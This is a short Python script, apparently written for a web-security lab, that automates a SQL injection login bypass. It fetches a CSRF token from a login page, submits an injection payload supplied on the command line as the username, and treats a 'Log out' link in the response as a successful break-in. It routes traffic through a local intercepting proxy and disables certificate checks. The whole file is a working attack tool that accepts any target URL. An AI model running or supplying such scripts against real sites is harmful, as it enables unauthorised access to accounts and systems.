import requests
import sys
import urllib3
from bs4 import BeautifulSoup

# To ignore the warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define the proxy settings
proxies = {
    'http': 'http://127.0.0.1:8080',  # Replace with your HTTP proxy if different
    'https': 'http://127.0.0.1:8080',  # Use HTTP proxy for HTTPS as well
}

def get_csrf_token(s, url):
    # Send a GET request through the proxy
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')
    print("[+] CSRF token obtained: %s" % csrf)
    return csrf

def exploit_sqli(s, url, payload):
    # Get the CSRF token using the session and proxy
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": payload, "password": "randomtext"}
    # Send a POST request through the proxy
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <sqli_payload>" % sys.argv[0])
        print("[-] Example: %s www.example.com \"'\"" % sys.argv[0])
        sys.exit(1)

    # Create a session object
    s = requests.Session()
    print(s)
    # Attempt the SQL Injection via proxy
    if exploit_sqli(s, url, sqli_payload):
        print("[+] SQL Injection successful")
    else:
        print("[-] SQL Injection failed")


